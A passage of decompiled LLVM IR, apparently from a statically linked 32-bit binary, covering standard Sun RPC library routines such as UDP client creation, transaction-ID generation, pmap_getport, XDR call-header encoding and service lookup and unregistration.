  store i32 ptrtoint (i32* @global_var_8074fd8.814 to i32), i32* %v2_80635e6, align 4
  %v1_80635ed = add i32 %v2_806356a, 8
  store i32 %v1_80635ed, i32* %eax.global-to-local, align 4
  %v1_80635f0 = load i32, i32* @ebp, align 4
  %v2_80635f0 = add i32 %v1_80635f0, 8
  %v3_80635f0 = inttoptr i32 %v2_80635f0 to i32*
  store i32 %v2_806356a, i32* %v3_80635f0, align 4
  %v0_80635fa = load i32, i32* %eax.global-to-local, align 4
  %tmp38 = inttoptr i32 %v0_80635fa to i16*
  %v6_80635fb = call i32 @memcpy(i16* %tmp38, i32 %arg1, i32 16)
  store i32 %arg4, i32* %edx.global-to-local, align 4
  store i32 %tmp13, i32* %eax.global-to-local, align 4
  %v0_806360b = load i32, i32* @ebx, align 4
  %v2_806360b = add i32 %v2_806356a, 92
  %v3_806360b = inttoptr i32 %v2_806360b to i32*
  store i32 %v0_806360b, i32* %v3_806360b, align 4
  %v1_806360e = add i32 %v2_806356a, 56
  store i32 %v1_806360e, i32* @ebx, align 4
  %v1_8063611 = add i32 %v2_806356a, 24
  %v2_8063611 = inttoptr i32 %v1_8063611 to i32*
  store i32 16, i32* %v2_8063611, align 4
  %v0_8063618 = load i32, i32* %edx.global-to-local, align 4
  %v2_8063618 = add i32 %v2_806356a, 28
  %v3_8063618 = inttoptr i32 %v2_8063618 to i32*
  store i32 %v0_8063618, i32* %v3_8063618, align 4
  %v0_806361b = load i32, i32* %eax.global-to-local, align 4
  %v2_806361b = add i32 %v2_806356a, 32
  %v3_806361b = inttoptr i32 %v2_806361b to i32*
  store i32 %v0_806361b, i32* %v3_806361b, align 4
  %v1_806361e = add i32 %v2_806356a, 36
  %v2_806361e = inttoptr i32 %v1_806361e to i32*
  store i32 -1, i32* %v2_806361e, align 4
  %v1_8063625 = add i32 %v2_806356a, 40
  %v2_8063625 = inttoptr i32 %v1_8063625 to i32*
  store i32 -1, i32* %v2_8063625, align 4
  %v0_806362c = load i32, i32* @edi, align 4
  %v2_806362c = add i32 %v2_806356a, 84
  %v3_806362c = inttoptr i32 %v2_806362c to i32*
  store i32 %v0_806362c, i32* %v3_806362c, align 4
  %v0_806362f = call i32 @_create_xid()
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %v0_806362f, i32* %stack_var_-72, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-112, align 4
  %v0_806365a = load i32, i32* @edi, align 4
  %v3_806365b = load i32, i32* %v3_80635ae, align 4
  %v0_806365e = load i32, i32* @ebx, align 4
  %v4_806365f = inttoptr i32 %v0_806365e to i32*
  %v5_806365f = call i32 @__GI_xdrmem_create(i32* %v4_806365f, i32 %v3_806365b, i32 %v0_806365a, i32 0)
  %v2_8063667 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8063667, i32* @eax, align 4
  %v0_806366c = load i32, i32* @ebx, align 4
  %tmp39 = inttoptr i32 %v0_806366c to i32*
  %v5_806366d = call i32 @__GI_xdr_callhdr(i32* %tmp39, i32 %v2_8063667)
  store i32 %v5_806366d, i32* %eax.global-to-local, align 4
  %v1_8063675 = icmp eq i32 %v5_806366d, 0
  br i1 %v1_8063675, label %dec_label_pc_8063747, label %dec_label_pc_806367d

dec_label_pc_806367d:                             ; preds = %dec_label_pc_80635e6
  %v1_806367d = add i32 %v2_806356a, 60
  %v2_806367d = inttoptr i32 %v1_806367d to i32*
  %v3_806367d = load i32, i32* %v2_806367d, align 4
  store i32 %v3_806367d, i32* %eax.global-to-local, align 4
  store i32 134624903, i32* %stack_var_-112, align 4
  %v5_8063684 = add i32 %v3_806367d, 16
  %v6_8063684 = inttoptr i32 %v5_8063684 to i32*
  %v7_8063684 = load i32, i32* %v6_8063684, align 4
  call void @__pseudo_call(i32 %v7_8063684)
  %v0_806368a = load i32, i32* %eax.global-to-local, align 4
  %v2_806368a = add i32 %v2_806356a, 80
  %v3_806368a = inttoptr i32 %v2_806368a to i32*
  store i32 %v0_806368a, i32* %v3_806368a, align 4
  store i32 %tmp13, i32* %eax.global-to-local, align 4
  %v2_8063691 = load i32, i32* %arg5, align 4
  %v4_8063691 = icmp slt i32 %v2_8063691, 0
  %v1_8063694 = icmp eq i1 %v4_8063691, false
  br i1 %v1_8063694, label %dec_label_pc_806372e, label %dec_label_pc_806369a

dec_label_pc_806369a:                             ; preds = %dec_label_pc_806367d
  store i32 1, i32* %stack_var_-24, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v5_80636a9 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v5_80636a9, i32* %eax.global-to-local, align 4
  store i32 %tmp13, i32* %edx.global-to-local, align 4
  %v2_80636b8 = icmp slt i32 %v5_80636a9, 0
  store i32 %v5_80636a9, i32* %arg5, align 4
  %v1_80636bc = icmp eq i1 %v2_80636b8, false
  br i1 %v1_80636bc, label %dec_label_pc_80636d7, label %dec_label_pc_80636be

dec_label_pc_80636be:                             ; preds = %dec_label_pc_806369a
  %v0_80636be = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80636be, i32* %eax.global-to-local, align 4
  %v1_80636c3 = inttoptr i32 %v0_80636be to i32*
  store i32 12, i32* %v1_80636c3, align 4
  store i32 %v0_80636be, i32* @ebx, align 4
  %v0_80636cb = load i32, i32* %stack_var_-112, align 4
  %v1_80636cb = call i32 @__errno_location(i32 %v0_80636cb)
  store i32 %v1_80636cb, i32* %eax.global-to-local, align 4
  %v1_80636d0 = inttoptr i32 %v1_80636cb to i32*
  %v2_80636d0 = load i32, i32* %v1_80636d0, align 4
  store i32 %v2_80636d0, i32* %eax.global-to-local, align 4
  %v1_80636d2 = load i32, i32* @ebx, align 4
  %v2_80636d2 = add i32 %v1_80636d2, 8
  %v3_80636d2 = inttoptr i32 %v2_80636d2 to i32*
  store i32 %v2_80636d0, i32* %v3_80636d2, align 4
  br label %dec_label_pc_8063747

dec_label_pc_80636d7:                             ; preds = %dec_label_pc_806369a
  %v0_80636d7 = load i32, i32* @ecx, align 4
  store i32 %v5_80636a9, i32* %stack_var_-112, align 4
  %v7_80636dc = call i32 @__GI_bindresvport(i32 %v5_80636a9, i16* null, i32 %v0_80636d7, i32 %v0_80636d7)
  store i32 %tmp13, i32* %eax.global-to-local, align 4
  %v2_80636f5 = load i32, i32* %arg5, align 4
  store i32 %v2_80636f5, i32* %stack_var_-112, align 4
  %v4_80636f7 = ptrtoint i32* %stack_var_-24 to i32
  %v5_80636f7 = call i32 @ioctl(i32 %v2_80636f5, i32 21537, i32 %v4_80636f7)
  %v2_80636fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80636fc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  store i32 4, i32* %stack_var_-112, align 4
  store i32 %tmp13, i32* %edx.global-to-local, align 4
  %v2_806371b = load i32, i32* %arg5, align 4
  %v5_806371d = call i32 @__GI_setsockopt(i32 %v2_806371b, i32 0, i32 11, i32 %v2_80636fc, i32 4)
  store i32 %v5_806371d, i32* %eax.global-to-local, align 4
  %v1_8063725 = add i32 %v2_806356a, 4
  %v2_8063725 = inttoptr i32 %v1_8063725 to i32*
  store i32 1, i32* %v2_8063725, align 4
  br label %dec_label_pc_8063735

dec_label_pc_806372e:                             ; preds = %dec_label_pc_806367d
  %v1_806372e = add i32 %v2_806356a, 4
  %v2_806372e = inttoptr i32 %v1_806372e to i32*
  store i32 0, i32* %v2_806372e, align 4
  br label %dec_label_pc_8063735

dec_label_pc_8063735:                             ; preds = %dec_label_pc_80636d7, %dec_label_pc_806372e
  store i32 %tmp13, i32* %edx.global-to-local, align 4
  %v2_8063739 = load i32, i32* %arg5, align 4
  store i32 %v2_8063739, i32* %eax.global-to-local, align 4
  %v2_806373b = inttoptr i32 %v2_806356a to i32*
  store i32 %v2_8063739, i32* %v2_806373b, align 4
  %v0_806373d = call i32 @authnone_create()
  store i32 %v0_806373d, i32* %eax.global-to-local, align 4
  %v1_8063742 = load i32, i32* @ebp, align 4
  %v2_8063742 = inttoptr i32 %v1_8063742 to i32*
  store i32 %v0_806373d, i32* %v2_8063742, align 4
  br label %dec_label_pc_8063769

dec_label_pc_8063747:                             ; preds = %dec_label_pc_80635e6, %dec_label_pc_80635bc, %dec_label_pc_80636be, %dec_label_pc_806357c
  %v1_8063747 = icmp eq i32 %v2_806356a, 0
  br i1 %v1_8063747, label %dec_label_pc_8063757, label %dec_label_pc_806374b

dec_label_pc_806374b:                             ; preds = %dec_label_pc_8063747
  %v2_806374f = call i32 @free(i32 %v2_806356a)
  store i32 %v2_806374f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063757

dec_label_pc_8063757:                             ; preds = %dec_label_pc_8063747, %dec_label_pc_806374b
  %v0_8063757 = load i32, i32* @ebp, align 4
  %v1_8063757 = icmp eq i32 %v0_8063757, 0
  br i1 %v1_8063757, label %dec_label_pc_8063769, label %dec_label_pc_806375b

dec_label_pc_806375b:                             ; preds = %dec_label_pc_8063757
  store i32 %v0_8063757, i32* %stack_var_-112, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8063761 = call i32 @free(i32 %v0_8063757)
  store i32 %v1_8063761, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063769

dec_label_pc_8063769:                             ; preds = %dec_label_pc_8063757, %dec_label_pc_8063735, %dec_label_pc_806375b
  %v0_806376c = load i32, i32* @ebp, align 4
  store i32 %v0_806376c, i32* %eax.global-to-local, align 4
  %v2_806376f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806376f, i32* @esi, align 4
  store i32 %v0_806353b, i32* @edi, align 4
  store i32 %v0_806353a, i32* @ebp, align 4
  ret i32 %v0_806376c

; uselistorder directives
  uselistorder i32 %v5_80636a9, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_80635cf, { 1, 0 }
  uselistorder i32 %v6_80635c7, { 1, 0 }
  uselistorder i32 %v2_806356a, { 17, 1, 11, 2, 0, 16, 15, 14, 13, 12, 10, 3, 5, 4, 6, 9, 8, 7, 20, 18, 19, 21 }
  uselistorder i32* %stack_var_-112, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32 %tmp13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 3, 2, 1 }
  uselistorder i32 92, { 1, 0 }
  uselistorder i32* %arg5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 0, 3, 2 }
  uselistorder label %dec_label_pc_8063769, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063757, { 1, 0 }
  uselistorder label %dec_label_pc_8063747, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8063735, { 1, 0 }
  uselistorder label %dec_label_pc_80635e6, { 1, 0 }
  uselistorder label %dec_label_pc_806357c, { 1, 0 }
}

define i32 @_create_xid() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8063d4c = load i32, i32* @ebx, align 4
  store i32 %v0_8063d4c, i32* %stack_var_-4, align 4
  %v2_8063d5a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8063d5a, i32* @ebx, align 4
  %v4_8063d5f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_807d9c8.816 to i32))
  %v1_8063d6b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807d9c8.816 to i32))
  %v0_8063d73 = load i8, i8* @global_var_807d9e0.817, align 32
  %v1_8063d73 = icmp eq i8 %v0_8063d73, 0
  %v1_8063d7a = icmp eq i1 %v1_8063d73, false
  br i1 %v1_8063d7a, label %dec_label_pc_8063da9, label %dec_label_pc_8063d7c

dec_label_pc_8063d7c:                             ; preds = %entry
  %v0_8063d7c = load i32, i32* @ecx, align 4
  %v2_8063d80 = ptrtoint i32* %stack_var_-16 to i32
  %v4_8063d85 = call i32 @gettimeofday(i32 %v2_8063d80, i32 0, i32 %v0_8063d7c, i32 %v0_8063d7c)
  %v4_8063d95 = load i32, i32* %stack_var_-16, align 4
  %v5_8063d95 = xor i32 %v4_8063d95, %tmp
  %v2_8063d9a = trunc i32 %v5_8063d95 to i16
  %v3_8063d9a = call i32 @__GI_srand48_r(i16 %v2_8063d9a, i32 ptrtoint (i32* @global_var_807d9e4.818 to i32))
  store i8 1, i8* @global_var_807d9e0.817, align 32
  br label %dec_label_pc_8063da9

dec_label_pc_8063da9:                             ; preds = %entry, %dec_label_pc_8063d7c
  %v2_8063da9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8063dad = load i32, i32* @ecx, align 4
  %v4_8063db5 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_807d9e4.818 to i32), i32 %v2_8063da9, i32 %v0_8063dad, i32 %v0_8063dad)
  %v3_8063dbf = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v3_8063dc4 = load i32, i32* %stack_var_-8, align 4
  %v2_8063dcb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8063dcb, i32* @ebx, align 4
  ret i32 %v3_8063dc4

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_807d9e4.818 to i32), { 1, 0 }
  uselistorder i8* @global_var_807d9e0.817, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_807d9c8.816 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8063da9, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-14 = alloca i16, align 2
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8063dd0 = load i32, i32* @edi, align 4
  %v0_8063dd2 = load i32, i32* @ebx, align 4
  store i32 %v0_8063dd2, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  store i16 0, i16* %stack_var_-14, align 2
  store i32 -1, i32* %stack_var_-20, align 4
  %v1_8063de9 = add i32 %arg1, 2
  %v2_8063de9 = inttoptr i32 %v1_8063de9 to i16*
  store i16 28416, i16* %v2_8063de9, align 2
  %v2_8063df9 = ptrtoint i32* %stack_var_-20 to i32
  %v0_8063e11 = load i32, i32* @edi, align 4
  %v9_8063e12 = call i32 @__GI_clntudp_bufcreate(i32 %v0_8063e11, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8063df9, i32 400, i32 400)
  %v1_8063e1a = icmp eq i32 %v9_8063e12, 0
  store i32 %v9_8063e12, i32* @ebx, align 4
  br i1 %v1_8063e1a, label %dec_label_pc_8063ead, label %dec_label_pc_8063ea0

dec_label_pc_8063ea0:                             ; preds = %entry
  %v0_8063e24 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8063e24, i32* %esi.global-to-local, align 4
  %v0_8063e53 = load i32, i32* @ebx, align 4
  %v1_8063e53 = add i32 %v0_8063e53, 4
  %v2_8063e53 = inttoptr i32 %v1_8063e53 to i32*
  %v3_8063e53 = load i32, i32* %v2_8063e53, align 4
  store i32 %v3_8063e53, i32* @ecx, align 4
  %v5_8063e71 = inttoptr i32 %v3_8063e53 to i32*
  %v6_8063e71 = load i32, i32* %v5_8063e71, align 4
  call void @__pseudo_call(i32 %v6_8063e71)
  %v0_8063e7a = load i32, i32* %esi.global-to-local, align 4
  %v1_8063e7a = inttoptr i32 %v0_8063e7a to i32*
  store i32 14, i32* %v1_8063e7a, align 4
  %v0_8063e82 = load i32, i32* @ebx, align 4
  %v1_8063e82 = add i32 %v0_8063e82, 4
  %v2_8063e82 = inttoptr i32 %v1_8063e82 to i32*
  %v3_8063e82 = load i32, i32* %v2_8063e82, align 4
  %v5_8063e8a = add i32 %v3_8063e82, 8
  %v6_8063e8a = inttoptr i32 %v5_8063e8a to i32*
  %v7_8063e8a = load i32, i32* %v6_8063e8a, align 4
  call void @__pseudo_call(i32 %v7_8063e8a)
  %v0_8063ea0 = load i32, i32* @ebx, align 4
  %v1_8063ea0 = add i32 %v0_8063ea0, 4
  %v2_8063ea0 = inttoptr i32 %v1_8063ea0 to i32*
  %v3_8063ea0 = load i32, i32* %v2_8063ea0, align 4
  %v5_8063ea7 = add i32 %v3_8063ea0, 16
  %v6_8063ea7 = inttoptr i32 %v5_8063ea7 to i32*
  %v7_8063ea7 = load i32, i32* %v6_8063ea7, align 4
  call void @__pseudo_call(i32 %v7_8063ea7)
  br label %dec_label_pc_8063ead

dec_label_pc_8063ead:                             ; preds = %entry, %dec_label_pc_8063ea0
  %v0_8063ead = load i32, i32* @edi, align 4
  %v1_8063ead = add i32 %v0_8063ead, 2
  %v2_8063ead = inttoptr i32 %v1_8063ead to i16*
  store i16 0, i16* %v2_8063ead, align 2
  %v3_8063eb3 = load i16, i16* %stack_var_-14, align 2
  %v4_8063eb3 = sext i16 %v3_8063eb3 to i32
  %v2_8063ebb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063ebb, i32* @ebx, align 4
  store i32 %v0_8063dd0, i32* @edi, align 4
  ret i32 %v4_8063eb3

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i16* %stack_var_-14, { 1, 0 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8063ead, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_8063ffa = load i32, i32* @esi, align 4
  %v0_8063ffb = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %tmp1, i32* %esi.global-to-local, align 4
  %v1_8064007 = add i32 %arg2, 4
  %v2_8064007 = inttoptr i32 %v1_8064007 to i32*
  store i32 0, i32* %v2_8064007, align 4
  %v0_806400e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806400e = add i32 %v0_806400e, 8
  %v2_806400e = inttoptr i32 %v1_806400e to i32*
  store i32 2, i32* %v2_806400e, align 4
  %v0_8064015 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064015 = inttoptr i32 %v0_8064015 to i32*
  %v2_8064015 = load i32, i32* %v1_8064015, align 4
  %v3_8064015 = icmp eq i32 %v2_8064015, 0
  %v1_8064018 = icmp eq i1 %v3_8064015, false
  br i1 %v1_8064018, label %dec_label_pc_8064076, label %dec_label_pc_806401a

dec_label_pc_806401a:                             ; preds = %entry
  %v0_806401c = load i32, i32* %ebx.global-to-local, align 4
  %v3_806401e = call i32 @xdr_u_long(i32* %v1_8064015, i32 %v0_806401c)
  %v1_8064026 = icmp eq i32 %v3_806401e, 0
  br i1 %v1_8064026, label %dec_label_pc_8064076, label %dec_label_pc_806402a

dec_label_pc_806402a:                             ; preds = %dec_label_pc_806401a
  %v0_806402c = load i32, i32* @ebx, align 4
  %v1_806402c = add i32 %v0_806402c, 4
  %v0_8064030 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064031 = call i32 @xdr_enum(i32 %v0_8064030, i32 %v1_806402c)
  %v1_8064039 = icmp eq i32 %v2_8064031, 0
  br i1 %v1_8064039, label %dec_label_pc_8064076, label %dec_label_pc_806403d

dec_label_pc_806403d:                             ; preds = %dec_label_pc_806402a
  %v0_806403f = load i32, i32* @ebx, align 4
  %v1_806403f = add i32 %v0_806403f, 8
  store i32 %v1_806403f, i32* @eax, align 4
  %v0_8064043 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064044 = inttoptr i32 %v0_8064043 to i32*
  %v3_8064044 = call i32 @xdr_u_long(i32* %v2_8064044, i32 %v1_806403f)
  %v1_806404c = icmp eq i32 %v3_8064044, 0
  br i1 %v1_806404c, label %dec_label_pc_8064076, label %dec_label_pc_8064050

dec_label_pc_8064050:                             ; preds = %dec_label_pc_806403d
  %v0_8064052 = load i32, i32* @ebx, align 4
  %v1_8064052 = add i32 %v0_8064052, 12
  store i32 %v1_8064052, i32* @eax, align 4
  %v0_8064056 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064057 = inttoptr i32 %v0_8064056 to i32*
  %v3_8064057 = call i32 @xdr_u_long(i32* %v2_8064057, i32 %v1_8064052)
  %v1_806405f = icmp eq i32 %v3_8064057, 0
  br i1 %v1_806405f, label %dec_label_pc_8064076, label %dec_label_pc_8064063

dec_label_pc_8064063:                             ; preds = %dec_label_pc_8064050
  %v0_8064063 = load i32, i32* @ebx, align 4
  %v1_8064063 = add i32 %v0_8064063, 16
  store i32 %v1_8064063, i32* @eax, align 4
  %v0_8064066 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8063ffb, i32* %ebx.global-to-local, align 4
  store i32 %v0_8063ffa, i32* %esi.global-to-local, align 4
  %v2_8064071 = inttoptr i32 %v0_8064066 to i32*
  %v3_8064071 = call i32 @xdr_u_long(i32* %v2_8064071, i32 %v1_8064063)
  br label %dec_label_pc_8064076

dec_label_pc_8064076:                             ; preds = %dec_label_pc_8064050, %dec_label_pc_806403d, %dec_label_pc_806402a, %dec_label_pc_806401a, %entry, %dec_label_pc_8064063
  store i32 %v0_8063ffb, i32* @ebx, align 4
  store i32 %v0_8063ffa, i32* @esi, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_8063ffb, { 1, 0 }
  uselistorder i32 %v0_8063ffa, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8064076, { 5, 0, 1, 2, 3, 4 }
}

define i32 @xdr_opaque_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_806414e = load i32, i32* @esi, align 4
  %v0_806414f = load i32, i32* @ebx, align 4
  store i32 %v0_806414f, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_806415d = call i32 @xdr_enum(i32 %arg1, i32 %arg2)
  %v1_8064167 = icmp eq i32 %v2_806415d, 0
  br i1 %v1_8064167, label %dec_label_pc_8064183, label %dec_label_pc_806416b

dec_label_pc_806416b:                             ; preds = %entry
  %v0_8064170 = load i32, i32* @ebx, align 4
  %v1_8064170 = add i32 %v0_8064170, 8
  %v1_8064174 = add i32 %v0_8064170, 4
  %v0_8064178 = load i32, i32* @esi, align 4
  %v4_8064179 = inttoptr i32 %v0_8064178 to i32*
  %v5_8064179 = call i32 @xdr_bytes(i32* %v4_8064179, i32 %v1_8064174, i32 %v1_8064170, i32 400)
  br label %dec_label_pc_8064183

dec_label_pc_8064183:                             ; preds = %entry, %dec_label_pc_806416b
  %v0_8064184 = phi i32 [ 0, %entry ], [ %v5_8064179, %dec_label_pc_806416b ]
  %v2_8064186 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8064186, i32* @ebx, align 4
  store i32 %v0_806414e, i32* @esi, align 4
  ret i32 %v0_8064184

; uselistorder directives
  uselistorder i32 (i32, i32)* @xdr_enum, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064183, { 1, 0 }
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_806440d = load i32, i32* @edi, align 4
  %v0_806440e = load i32, i32* @eax, align 4
  store i32 %v0_806440e, i32* @edi, align 4
  %v0_8064411 = load i32, i32* @ecx, align 4
  store i32 %v0_8064411, i32* @esi, align 4
  %v0_8064413 = load i32, i32* @ebx, align 4
  %v0_8064414 = load i32, i32* @edx, align 4
  store i32 %v0_8064414, i32* @ebx, align 4
  %v1_8064416 = call i32 @__rpc_thread_variables(i32 %v0_8064413)
  store i32 %v1_8064416, i32* %eax.global-to-local, align 4
  %v1_806441d = add i32 %v1_8064416, 184
  %storemerge.in1 = inttoptr i32 %v1_806441d to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_80644333 = icmp eq i32 %storemerge2, 0
  %v1_806443510 = icmp eq i1 %v1_80644333, false
  br i1 %v1_806443510, label %dec_label_pc_8064425.lr.ph, label %dec_label_pc_8064437

dec_label_pc_8064425.lr.ph:                       ; preds = %entry
  %v4_8064425.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8064425

dec_label_pc_8064425:                             ; preds = %dec_label_pc_8064425.lr.ph, %dec_label_pc_806442f
  %v0_806443814 = phi i32 [ 0, %dec_label_pc_8064425.lr.ph ], [ %v0_806442f, %dec_label_pc_806442f ]
  %v0_806442f = phi i32 [ %storemerge2, %dec_label_pc_8064425.lr.ph ], [ %storemerge, %dec_label_pc_806442f ]
  %v1_8064425 = add i32 %v0_806442f, 4
  %v2_8064425 = inttoptr i32 %v1_8064425 to i32*
  %v3_8064425 = load i32, i32* %v2_8064425, align 4
  %v15_8064425 = icmp eq i32 %v3_8064425, %v4_8064425.pre
  %v1_8064428 = icmp eq i1 %v15_8064425, false
  br i1 %v1_8064428, label %dec_label_pc_806442f, label %dec_label_pc_806442a

dec_label_pc_806442a:                             ; preds = %dec_label_pc_8064425
  %v1_806442a = add i32 %v0_806442f, 8
  %v2_806442a = inttoptr i32 %v1_806442a to i32*
  %v3_806442a = load i32, i32* %v2_806442a, align 4
  %v4_806442a = load i32, i32* @ebx, align 4
  %v15_806442a = icmp eq i32 %v3_806442a, %v4_806442a
  br i1 %v15_806442a, label %dec_label_pc_806442a.dec_label_pc_8064437_crit_edge, label %dec_label_pc_806442f

dec_label_pc_806442f:                             ; preds = %dec_label_pc_806442a, %dec_label_pc_8064425
  %storemerge.in = inttoptr i32 %v0_806442f to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8064433 = icmp eq i32 %storemerge, 0
  %v1_8064435 = icmp eq i1 %v1_8064433, false
  br i1 %v1_8064435, label %dec_label_pc_8064425, label %dec_label_pc_8064433.dec_label_pc_8064437_crit_edge

dec_label_pc_806442a.dec_label_pc_8064437_crit_edge: ; preds = %dec_label_pc_806442a
  br label %dec_label_pc_8064437

dec_label_pc_8064433.dec_label_pc_8064437_crit_edge: ; preds = %dec_label_pc_806442f
  br label %dec_label_pc_8064437

dec_label_pc_8064437:                             ; preds = %dec_label_pc_8064433.dec_label_pc_8064437_crit_edge, %dec_label_pc_806442a.dec_label_pc_8064437_crit_edge, %entry
  %v0_8064438 = phi i32 [ %v0_806442f, %dec_label_pc_8064433.dec_label_pc_8064437_crit_edge ], [ %v0_806443814, %dec_label_pc_806442a.dec_label_pc_8064437_crit_edge ], [ 0, %entry ]
  %v1_8064438 = load i32, i32* @esi, align 4
  %v2_8064438 = inttoptr i32 %v1_8064438 to i32*
  store i32 %v0_8064438, i32* %v2_8064438, align 4
  store i32 %v0_806440d, i32* @edi, align 4
  %v0_806443c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_806443c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_806442f, { 0, 2, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8064425, { 1, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8064672 = load i32, i32* @ebp, align 4
  %v0_8064673 = load i32, i32* @edi, align 4
  %v0_8064674 = load i32, i32* @esi, align 4
  %v0_8064675 = load i32, i32* @ebx, align 4
  store i32 %v0_8064675, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v2_806467d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_806467d, i32* @ecx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  %v3_8064689 = call i32 @svc_find(i32 %v0_8064675, i32 %v0_8064674, i32 %v0_8064673)
  %v1_806468e = icmp eq i32 %v3_8064689, 0
  store i32 %v3_8064689, i32* @ebx, align 4
  br i1 %v1_806468e, label %entry.dec_label_pc_80646c8_crit_edge, label %dec_label_pc_8064694

entry.dec_label_pc_80646c8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80646c8

dec_label_pc_8064694:                             ; preds = %entry
  %v3_8064694 = load i32, i32* %stack_var_-20, align 4
  %v1_8064698 = inttoptr i32 %v3_8064689 to i32*
  %v2_8064698 = load i32, i32* %v1_8064698, align 4
  store i32 %v2_8064698, i32* @esi, align 4
  %v1_806469a = icmp eq i32 %v3_8064694, 0
  %v1_806469c = icmp eq i1 %v1_806469a, false
  br i1 %v1_806469c, label %dec_label_pc_80646ab, label %dec_label_pc_806469e

dec_label_pc_806469e:                             ; preds = %dec_label_pc_8064694
  %v0_806469e = load i32, i32* %stack_var_-16, align 4
